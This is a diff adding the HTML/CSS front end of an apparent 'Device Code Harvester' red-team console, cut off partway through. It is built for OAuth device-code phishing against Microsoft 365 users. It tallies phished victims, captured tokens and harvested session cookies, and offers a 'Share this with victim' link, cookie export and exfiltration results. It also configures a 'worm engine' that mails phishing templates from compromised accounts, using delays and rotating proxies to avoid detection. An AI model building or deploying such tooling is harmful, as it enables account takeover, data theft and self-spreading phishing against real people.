@@ -1,0 +1,2470 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Code Harvester | Red Team Console</title>
+    <meta name="description" content="Enterprise-grade OAuth device code harvesting dashboard - Authorized testing only">
+    <style>
+        /* ==================== ROOT VARIABLES ==================== */
+        :root {
+            --bg-primary: #1a0a0a;
+            --bg-secondary: #2d1414;
+            --bg-tertiary: #1f0d0d;
+            --text-primary: #ffffff;
+            --text-secondary: #e8a8a8;
+            --text-muted: #a67777;
+            --border: #4a2020;
+            --accent: #dc3545;
+            --accent-hover: #ff4757;
+            --success: #28a745;
+            --success-hover: #34c759;
+            --danger: #ff6b6b;
+            --danger-hover: #ff8787;
+            --warning: #ffc107;
+            --warning-hover: #ffd93d;
+            --card-radius: 12px;
+            --transition: all 0.2s ease;
+        }
+
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
+            background: linear-gradient(rgba(26, 10, 10, 0.92), rgba(26, 10, 10, 0.92)), url('/static/background.jpg') center/cover fixed;
+            background-attachment: fixed;
+            color: var(--text-primary);
+            line-height: 1.5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* ==================== LAYOUT ==================== */
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* ==================== HEADER ==================== */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 16px;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .header-left h1 {
+            font-size: 1.75rem;
+            font-weight: 600;
+            background: linear-gradient(135deg, #dc3545 0%, #ff6b6b 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 0 0 30px rgba(220, 53, 69, 0.5);
+        }
+
+        .header-left p {
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+            margin-top: 4px;
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        /* ==================== BADGES ==================== */
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        .badge-success {
+            background: rgba(63, 185, 80, 0.15);
+            color: var(--success);
+            border: 1px solid rgba(63, 185, 80, 0.3);
+        }
+
+        .badge-danger {
+            background: rgba(248, 81, 73, 0.15);
+            color: var(--danger);
+            border: 1px solid rgba(248, 81, 73, 0.3);
+        }
+
+        .badge-warning {
+            background: rgba(210, 153, 34, 0.15);
+            color: var(--warning);
+            border: 1px solid rgba(210, 153, 34, 0.3);
+        }
+
+        .badge-info {
+            background: rgba(88, 166, 255, 0.15);
+            color: var(--accent);
+            border: 1px solid rgba(88, 166, 255, 0.3);
+        }
+
+        /* ==================== CARDS ==================== */
+        .card {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: var(--card-radius);
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+
+        .test-result-success {
+            border-color: rgba(40, 167, 69, 0.6);
+            background: rgba(40, 167, 69, 0.08);
+        }
+
+        .test-result-failure {
+            border-color: rgba(220, 53, 69, 0.6);
+            background: rgba(220, 53, 69, 0.08);
+        }
+
+        .test-result-running {
+            border-color: rgba(48, 144, 255, 0.6);
+            background: rgba(48, 144, 255, 0.08);
+        }
+
+        .badge-spinner {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .badge-spinner::before {
+            content: '';
+            width: 12px;
+            height: 12px;
+            border: 2px solid #2f80ed;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .card-header {
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .card-header h2 {
+            font-size: 1.1rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .card-body {
+            padding: 20px;
+        }
+
+        /* ==================== STATS GRID ==================== */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .stat-card {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            transition: var(--transition);
+            cursor: pointer;
+        }
+
+        .stat-card:hover {
+            border-color: var(--accent);
+            transform: translateY(-2px);
+        }
+
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--accent);
+        }
+
+        .stat-label {
+            font-size: 0.75rem;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 8px;
+        }
+
+        /* ==================== FORMS ==================== */
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--text-secondary);
+            margin-bottom: 6px;
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 10px 12px;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-size: 0.875rem;
+            transition: var(--transition);
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.1);
+        }
+
+        /* ==================== BUTTONS ==================== */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 0.875rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            border: none;
+        }
+
+        .btn-primary {
+            background: var(--accent);
+            color: var(--bg-primary);
+        }
+
+        .btn-primary:hover {
+            background: var(--accent-hover);
+            transform: translateY(-1px);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-success {
+            background: var(--success);
+            color: var(--bg-primary);
+        }
+
+        .btn-success:hover {
+            background: var(--success-hover);
+        }
+
+        .btn-danger {
+            background: var(--danger);
+            color: white;
+        }
+
+        .btn-danger:hover {
+            background: var(--danger-hover);
+        }
+
+        .btn-secondary {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+        }
+
+        .btn-secondary:hover {
+            background: var(--bg-secondary);
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+
+        /* ==================== GRID ==================== */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 16px;
+        }
+
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+        }
+
+        .flex {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        /* ==================== CODE & LOGS ==================== */
+        .code-block {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 16px;
+            font-family: 'SF Mono', 'Consolas', monospace;
+            font-size: 0.8rem;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .log-container {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: 'SF Mono', 'Consolas', monospace;
+            font-size: 0.75rem;
+        }
+
+        .log-entry {
+            padding: 4px 0;
+            border-bottom: 1px solid var(--border);
+            font-family: monospace;
+        }
+
+        .log-info { color: var(--accent); }
+        .log-success { color: var(--success); }
+        .log-warning { color: var(--warning); }
+        .log-error { color: var(--danger); }
+
+        /* ==================== TABS ==================== */
+        .tabs {
+            display: flex;
+            gap: 4px;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 20px;
+        }
+
+        .tab {
+            padding: 10px 20px;
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            cursor: pointer;
+            font-size: 0.875rem;
+            font-weight: 600;
+            transition: var(--transition);
+            border-radius: 8px 8px 0 0;
+        }
+
+        .tab:hover {
+            color: var(--accent);
+            background: rgba(88, 166, 255, 0.1);
+        }
+
+        .tab.active {
+            color: var(--accent);
+            border-bottom: 2px solid var(--accent);
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        /* ==================== MODAL ==================== */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(4px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            width: 90%;
+            max-width: 700px;
+            max-height: 85vh;
+            overflow-y: auto;
+            padding: 24px;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .modal-header h3 {
+            font-size: 1.25rem;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 24px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .close-btn:hover {
+            color: var(--danger);
+        }
+
+        /* ==================== UTILITIES ==================== */
+        .mt-10 { margin-top: 10px; }
+        .mt-20 { margin-top: 20px; }
+        .mb-10 { margin-bottom: 10px; }
+        .mb-20 { margin-bottom: 20px; }
+        .hidden { display: none; }
+        .text-center { text-align: center; }
+        .text-muted { color: var(--text-muted); }
+
+        /* ==================== PROFILE LIST ==================== */
+        .profile-item {
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            background: var(--bg-tertiary);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .profile-item:hover {
+            border-color: var(--accent);
+        }
+
+        /* ==================== TOGGLE SWITCH ==================== */
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 24px;
+            cursor: pointer;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
+            margin: 0;
+            z-index: 2;
+            cursor: pointer;
+        }
+
+        .toggle-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: var(--border);
+            transition: 0.3s;
+            border-radius: 24px;
+        }
+
+        .toggle-slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: 0.3s;
+            border-radius: 50%;
+        }
+
+        input:checked + .toggle-slider {
+            background-color: var(--success);
+        }
+
+        input:checked + .toggle-slider:before {
+            transform: translateX(26px);
+        }
+
+        /* ==================== FOOTER ==================== */
+        .footer {
+            margin-top: auto;
+            padding: 30px 20px;
+            background: linear-gradient(135deg, rgba(45, 20, 20, 0.95) 0%, rgba(26, 10, 10, 0.98) 100%);
+            border-top: 2px solid var(--accent);
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+            text-align: center;
+        }
+
+        .footer-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .footer-section h4 {
+            color: var(--accent);
+            font-size: 1rem;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .footer-section ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .footer-section li {
+            margin: 6px 0;
+            color: var(--text-muted);
+        }
+
+        .footer-section a {
+            color: var(--accent);
+            text-decoration: none;
+            transition: var(--transition);
+        }
+
+        .footer-section a:hover {
+            color: var(--accent-hover);
+            text-decoration: underline;
+        }
+
+        .footer-divider {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--accent), transparent);
+            margin: 20px 0;
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 12px;
+            border-top: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .footer-bottom-left, .footer-bottom-right {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .footer-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 8px;
+            border-radius: 4px;
+            background: rgba(40, 167, 69, 0.1);
+            color: var(--success);
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        /* ==================== RESPONSIVE ==================== */
+        @media (max-width: 768px) {
+            .container { padding: 12px; }
+            .grid-2, .grid-3 { grid-template-columns: 1fr; }
+            .header { flex-direction: column; align-items: flex-start; }
+            .stats-grid { grid-template-columns: repeat(2, 1fr); }
+            .footer-content { grid-template-columns: 1fr; gap: 20px; }
+            .footer-bottom { flex-direction: column; text-align: center; justify-content: center; }
+        }
+
+        /* ==================== SCROLLBAR ==================== */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-tertiary); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+    </style>
+</head>
+<body>
+<div class="container">
+    <!-- Header -->
+    <div class="header">
+        <div class="header-left">
+            <h1>🔐 Device Code Harvester</h1>
+            <p>Enterprise-grade OAuth token harvesting & worm propagation platform</p>
+        </div>
+        <div class="header-actions">
+            <span id="wormIndicator" class="badge badge-warning">🐛 Worm: Loading...</span>
+            <button class="btn btn-secondary" onclick="openSettingsModal()">⚙️ Advanced Settings</button>
+            <button class="btn btn-secondary" onclick="toggleTheme()">🌓 Theme</button>
+        </div>
+    </div>
+
+    <!-- Status Bar -->
+    <div id="statusBar" class="hidden" style="padding: 12px 16px; border-radius: 8px; margin-bottom: 20px;"></div>
+
+    <!-- Statistics Grid -->
+    <div class="stats-grid" id="statsGrid">
+        <div class="stat-card" onclick="showWormDetails()">
+            <div class="stat-value" id="statPhished">0</div>
+            <div class="stat-label">📧 Total Phished</div>
+        </div>
+        <div class="stat-card" onclick="showWormDetails()">
+            <div class="stat-value" id="statCaptured">0</div>
+            <div class="stat-label">🔑 Total Captured</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="statCookies">0</div>
+            <div class="stat-label">🍪 Cookies Harvested</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="statSessions">0</div>
+            <div class="stat-label">🔄 Active Sessions</div>
+        </div>
+        <div class="stat-card" onclick="showWormDetails()">
+            <div class="stat-value" id="statWormEnabled">Loading...</div>
+            <div class="stat-label">🐛 Worm Engine</div>
+        </div>
+    </div>
+
+    <!-- Quick Config Card -->
+    <div class="card">
+        <div class="card-header">
+            <h2>⚡ Quick Configuration</h2>
+            <button class="btn btn-secondary" onclick="loadDefaultConfig()">Load Defaults</button>
+        </div>
+        <div class="card-body">
+            <div class="grid-2">
+                <div class="form-group">
+                    <label>🔑 Client ID</label>
+                    <input type="text" id="clientId" placeholder="Azure AD Application Client ID">
+                </div>
+                <div class="form-group">
+                    <label>🏢 Tenant</label>
+                    <input type="text" id="tenant" value="common" placeholder="common / organizations / tenant-id">
+                </div>
+            </div>
+            <div class="form-group">
+                <label>📝 OAuth Scopes</label>
+                <input type="text" id="scope" value="https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/Files.ReadWrite.All https://graph.microsoft.com/User.Read openid offline_access profile">
+            </div>
+            <div class="grid-2">
+                <div class="form-group">
+                    <label>🎯 Max Harvest Endpoints</label>
+                    <input type="number" id="maxEndpoints" value="4" min="1" max="12">
+                </div>
+                <div class="flex" style="align-items: center; padding-top: 28px;">
+                    <label style="display: flex; align-items: center; gap: 8px; margin: 0;">
+                        <input type="checkbox" id="refreshToken" checked> 🔄 Auto-refresh token
+                    </label>
+                    <label style="display: flex; align-items: center; gap: 8px; margin: 0;">
+                        <input type="checkbox" id="detectCA" checked> 🛡️ Detect Conditional Access
+                    </label>
+                </div>
+            </div>
+            <div class="flex" style="margin-top: 20px;">
+                <button class="btn btn-primary" id="startBtn" onclick="startCapture()">🚀 Start Capture</button>
+                <button class="btn btn-secondary" onclick="clearOutput()">🗑️ Clear Output</button>
+                <button class="btn btn-secondary" onclick="refreshAllStats()">📊 Refresh Stats</button>
+                <button class="btn btn-secondary" onclick="quickSaveProfile()">💾 Quick Save</button>
+            </div>
+            <div id="wormStatusDisplay" class="hidden" style="margin-top: 16px; padding: 12px; background: var(--bg-tertiary); border-radius: 8px; border-left: 3px solid var(--accent);"></div>
+        </div>
+    </div>
+
+    <!-- Capture Status Card -->
+    <div class="card hidden" id="captureCard">
+        <div class="card-header">
+            <h2>📡 Live Capture Status</h2>
+            <span id="captureStatusBadge" class="badge badge-info">Initializing</span>
+        </div>
+        <div class="card-body">
+            <div id="captureStatus">Starting capture session...</div>
+            <div id="deviceCodeArea" class="hidden mt-20">
+                <div style="background: rgba(88, 166, 255, 0.1); padding: 12px; border-radius: 8px; margin-bottom: 16px;">
+                    <strong>🎯 Present these credentials to the target:</strong>
+                </div>
+                <div class="grid-2">
+                    <div>
+                        <label>Verification URL</label>
+                        <div class="flex">
+                            <code id="verificationUri" style="flex:1; background: var(--bg-tertiary); padding: 8px; border-radius: 6px; word-break: break-all;"></code>
+                            <button class="btn btn-secondary" onclick="copyToClipboard('verificationUri')">Copy</button>
+                        </div>
+                    </div>
+                    <div>
+                        <label>User Code</label>
+                        <div class="flex">
+                            <code id="userCode" style="flex:1; background: var(--bg-tertiary); padding: 8px; border-radius: 6px; font-size: 1.2rem; font-weight: bold; letter-spacing: 2px;"></code>
+                            <button class="btn btn-secondary" onclick="copyToClipboard('userCode')">Copy</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="mt-10">
+                    <label>Shareable Link</label>
+                    <div class="flex" style="align-items: center; gap: 12px; flex-wrap: wrap;">
+                        <a id="shareLink" href="#" target="_blank" rel="noopener noreferrer" style="flex:1; min-width: 280px; display:block; background: var(--bg-tertiary); padding: 8px; border-radius: 6px; word-break: break-all; color: var(--text-primary); text-decoration: none;"></a>
+                        <button class="btn btn-secondary" onclick="copyToClipboard('shareLink')">Copy</button>
+                        <button class="btn btn-primary" onclick="openShareLink()">Share this with victim</button>
+                    </div>
+                </div>
+                <div class="mt-8">
+                    <label>Proxy Info</label>
+                    <div class="flex" style="align-items: center; gap: 12px;">
+                        <div style="flex:1; background: var(--bg-tertiary); padding: 8px; border-radius:6px;">Last proxy used: <span id="lastProxy">-</span></div>
+                    </div>
+                </div>
+                <p class="text-muted mt-10" style="font-size: 0.8rem;">The target visits the URL and enters the code. Polling will begin automatically.</p>
+            </div>
+            <div class="mt-20">
+                <label>📝 Live Event Log</label>
+                <div id="logContainer" class="log-container"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Results Card -->
+    <div class="card hidden" id="resultsCard">
+        <div class="card-header">
+            <h2>📊 Capture Results</h2>
+            <button class="btn btn-secondary" onclick="downloadFullReport()">📥 Download Report</button>
+        </div>
+        <div class="card-body">
+            <!-- Tokens -->
+            <div class="collapse-section">
+                <div class="collapse-header" onclick="toggleCollapse('tokensCollapse')">
+                    <strong>▶ 🔑 Tokens & Credentials</strong>
+                </div>
+                <div id="tokensCollapse" class="collapse-body hidden">
+                    <div id="tokensContent" class="code-block mt-10"></div>
+                </div>
+            </div>
+            <!-- User Info -->
+            <div class="collapse-section">
+                <div class="collapse-header" onclick="toggleCollapse('userCollapse')">
+                    <strong>▶ 👤 User Profile Information</strong>
+                </div>
+                <div id="userCollapse" class="collapse-body hidden">
+                    <div id="userContent" class="mt-10"></div>
+                </div>
+            </div>
+            <!-- Cookies -->
+            <div class="collapse-section">
+                <div class="collapse-header" onclick="toggleCollapse('cookiesCollapse')">
+                    <strong>▶ 🍪 Session Cookies (<span id="cookieCount">0</span>)</strong>
+                </div>
+                <div id="cookiesCollapse" class="collapse-body hidden">
+                    <div class="flex mb-10">
+                        <button class="btn btn-secondary" onclick="exportCookiesNetscape()">📄 Export Netscape Format</button>
+                        <button class="btn btn-secondary" onclick="exportCookiesJSON()">📋 Export JSON</button>
+                    </div>
+                    <div id="cookiesContent" class="code-block"></div>
+                </div>
+            </div>
+            <!-- Conditional Access -->
+            <div class="collapse-section">
+                <div class="collapse-header" onclick="toggleCollapse('caCollapse')">
+                    <strong>▶ 🛡️ Conditional Access Analysis</strong>
+                </div>
+                <div id="caCollapse" class="collapse-body hidden">
+                    <div id="caContent" class="mt-10"></div>
+                </div>
+            </div>
+            <!-- Full Session -->
+            <div class="collapse-section">
+                <div class="collapse-header" onclick="toggleCollapse('fullCollapse')">
+                    <strong>▶ 📦 Complete Session Payload</strong>
+                </div>
+                <div id="fullCollapse" class="collapse-body hidden">
+                    <div class="flex mb-10">
+                        <button class="btn btn-secondary" onclick="downloadSession()">💾 Download JSON</button>
+                        <button class="btn btn-secondary" onclick="copyFullSession()">📋 Copy to Clipboard</button>
+                    </div>
+                    <div id="fullContent" class="code-block"></div>
+                </div>
+            </div>
+            <!-- Exfiltration -->
+            <div class="collapse-section">
+                <div class="collapse-header" onclick="toggleCollapse('exfilCollapse')">
+                    <strong>▶ 📤 Exfiltration Results</strong>
+                </div>
+                <div id="exfilCollapse" class="collapse-body hidden">
+                    <div id="exfilContent" class="mt-10"></div>
+                </div>
+            </div>
+            <div class="flex mt-20">
+                <button class="btn btn-primary" onclick="startCapture()">🔄 New Capture</button>
+                <button class="btn btn-secondary" onclick="window.scrollTo({top:0,behavior:'smooth'})">⬆️ Back to Top</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ==================== SETTINGS MODAL ==================== -->
+<div id="settingsModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h3>⚙️ Advanced Configuration</h3>
+            <button class="close-btn" onclick="closeSettingsModal()">&times;</button>
+        </div>
+        <div class="tabs">
+            <button class="tab active" onclick="switchTab('wormTab')">🕷️ Worm Engine</button>
+            <button class="tab" onclick="switchTab('proxyTab')">🌐 Proxy & Network</button>
+            <button class="tab" onclick="switchTab('exfilTab')">📤 Exfiltration</button>
+            <button class="tab" onclick="switchTab('profileTab')">💾 Profile Manager</button>
+            <button class="tab" onclick="switchTab('runtimeTab')">⚙️ Runtime Overrides</button>
+        </div>
+        
+        <!-- Worm Tab -->
+        <div id="wormTab" class="tab-content active">
+            <div class="grid-2">
+                <div class="form-group">
+                    <label>🐛 Enable Worm</label>
+                    <div class="flex">
+                        <label class="toggle-switch"><input type="checkbox" id="wormEnabled"><span class="toggle-slider"></span></label>
+                        <span id="wormEnabledLabel">Disabled</span>
+                    </div>
+                    <small class="text-muted">Requires Mail.Send scope</small>
+                </div>
+                <div class="form-group">
+                    <label>📏 Max Propagation Depth</label>
+                    <input type="number" id="wormMaxDepth" value="2" min="1" max="5">
+                </div>
+                <div class="form-group">
+                    <label>🎯 Max Targets Per Capture</label>
+                    <input type="number" id="wormMaxTargets" value="5" min="1" max="20">
+                </div>
+                <div class="form-group">
+                    <label>🧵 Parallel Polling Threads</label>
+                    <input type="number" id="wormParallelPollers" value="2" min="1" max="10">
+                </div>
+                <div class="form-group">
+                    <label>⏱️ Min Email Delay (seconds)</label>
+                    <input type="number" id="wormMinDelay" value="30" min="5" max="300">
+                </div>
+                <div class="form-group">
+                    <label>⏱️ Max Email Delay (seconds)</label>
+                    <input type="number" id="wormMaxDelay" value="120" min="10" max="600">
+                </div>
+                <div class="form-group">
+                    <label>🎯 Minimum Score Threshold</label>
+                    <input type="number" id="wormMinScore" value="5" min="0" max="100">
+                </div>
+                <div class="form-group">
+                    <label>📧 HTML Template Path</label>
+                    <input type="text" id="wormHtmlTemplate" value="wormy.html" placeholder="wormy.html">
+                </div>
+                <div class="form-group">
+                    <label>📄 Plain Text Template Path</label>
+                    <input type="text" id="wormTxtTemplate" value="wormy.txt" placeholder="wormy.txt">
+                </div>
+                <div class="form-group">
+                    <label>🌍 Target Domain (empty = auto)</label>
+                    <input type="text" id="wormTargetDomain" placeholder="example.com">
+                </div>
+            </div>
+            <div class="flex mt-20" style="gap: 12px; flex-wrap: wrap;">
+                <button id="saveWormSettingsBtn" class="btn btn-primary" onclick="saveWormSettings(event)">💾 Save Worm Settings</button>
+                <button class="btn btn-secondary" onclick="previewWormTemplate()">👁️ Preview Templates</button>
+                <span class="text-muted" style="font-size: 0.75rem; margin-top: 8px;">⚡ Settings apply immediately via runtime overrides</span>
+            </div>
+            <div id="wormTemplatePreview" class="hidden" style="margin-top: 20px; padding: 16px; background: var(--bg-tertiary); border-radius: 8px; border-left: 3px solid var(--accent);">
+                <h5 style="margin-bottom: 12px;">📧 Email Template Preview</h5>
+                <div id="wormTemplateRendered" class="hidden" style="width:100%; min-height:260px; border:1px solid var(--border); border-radius:6px; overflow:hidden; background:#fff;">
+                    <iframe id="wormTemplateIframe" sandbox="" style="width:100%; min-height:260px; border:none;"></iframe>
+                </div>
+                <div id="wormTemplateCodeWrapper" style="margin-top: 12px; max-height: 260px; overflow-y: auto; background: var(--bg-secondary); padding: 12px; border-radius: 6px; border: 1px solid var(--border);">
+                    <div id="wormTemplateContent" style="font-family: monospace; font-size: 0.85rem; white-space: pre-wrap; word-break: break-word;"></div>
+                </div>
+                <div style="margin-top: 8px; font-size: 0.75rem; color: var(--text-secondary);">
+                    <span id="wormTemplateInfo">Loading...</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Runtime Overrides Tab -->
+        <div id="runtimeTab" class="tab-content">
+            <div class="flex" style="justify-content: space-between; align-items: center;">
+                <h4>Current Runtime Overrides</h4>
+                <div>
+                    <button class="btn btn-secondary" onclick="loadRuntimeOverrides()">🔄 Refresh</button>
+                    <button class="btn btn-secondary" id="editOverridesBtn" onclick="toggleEditOverrides()">✏️ Edit</button>
+                    <button class="btn btn-danger" onclick="confirmClearOverrides()">🧹 Clear Overrides</button>
+                </div>
+            </div>
+            <div style="margin-top:12px;">
+                <div id="runtimeOverridesContent" class="code-block">Loading...</div>
+                <textarea id="runtimeOverridesEditor" class="code-block hidden" style="height:200px; margin-top:8px; font-family: monospace;"></textarea>
+                <div style="margin-top:8px; display:flex; gap:8px;">
+                    <button class="btn btn-success hidden" id="saveOverridesBtn" onclick="saveRuntimeOverrides()">💾 Save</button>
+                    <button class="btn btn-secondary hidden" id="cancelOverridesBtn" onclick="cancelEditOverrides()">✖ Cancel</button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Proxy Tab -->
+        <div id="proxyTab" class="tab-content">
+            <div class="form-group">
+                <label>🌐 Proxy List (comma-separated)</label>
+                <textarea id="proxyList" rows="3" placeholder="http://user:pass@proxy1:8080, http://proxy2:8080, https://proxy3:443"></textarea>
+                <small class="text-muted">Format: protocol://user:pass@host:port - rotates per request</small>
+            </div>
+            <div class="form-group mt-10">
+                <label>🎭 Playwright Headless Browser</label>
+                <div class="flex">
+                    <label class="toggle-switch"><input type="checkbox" id="playwrightEnabled"><span class="toggle-slider"></span></label>
+                    <span id="playwrightLabel">Disabled</span>
+                </div>
+                <small class="text-muted">Advanced cookie extraction (requires more resources)</small>
+            </div>
+            <div class="flex mt-20" style="gap:8px;">
+                <button id="saveProxySettingsBtn" class="btn btn-primary" onclick="saveProxySettings(event)">💾 Save Proxy Settings</button>
+                <button class="btn btn-secondary" onclick="loadProxyListFromServer()">📥 Load From Server</button>
+            </div>
+            <div class="flex mt-12" style="gap:8px; align-items:center;">
+                <div>Loaded proxies: <strong id="proxyCount">0</strong></div>
+                <button class="btn btn-secondary" onclick="refreshProxyCount()">🔄 Refresh Count</button>
+                <button id="testProxyBtn" class="btn btn-info" onclick="testProxy(event)">🧪 Test Proxy</button>
+                <button class="btn btn-secondary" onclick="getNextProxy()">➡️ Get Next Proxy</button>
+            </div>
+            <div class="grid-3" style="gap:12px; margin-top:14px;">
+                <div class="stat-card" style="background: var(--bg-tertiary); cursor: default;">
+                    <div class="stat-value" id="proxyStatusCount">0</div>
+                    <div class="stat-label">Configured Proxies</div>
+                </div>
+                <div class="stat-card" style="background: var(--bg-tertiary); cursor: default;">
+                    <div class="stat-value" id="proxyStatusNext">N/A</div>
+                    <div class="stat-label">Next Proxy</div>
+                </div>
+                <div class="stat-card" style="background: var(--bg-tertiary); cursor: default;">
+                    <div class="stat-value" id="proxyStatusIndex">0</div>
+                    <div class="stat-label">Rotation Index</div>
+                </div>
+            </div>
+            <div id="proxyTestResult" class="card" style="margin-top:12px; display:none;">
+                <div class="card-header" style="display:flex; align-items:center; gap:12px;"><strong>Proxy Test Result</strong><span id="proxyTestBadge" class="badge badge-info">PENDING</span></div>
+                <div class="card-body" id="proxyTestResultBody">No test run yet.</div>
+            </div>
+        </div>
+        
+        <!-- Exfil Tab -->
+        <div id="exfilTab" class="tab-content">
+            <div class="form-group">
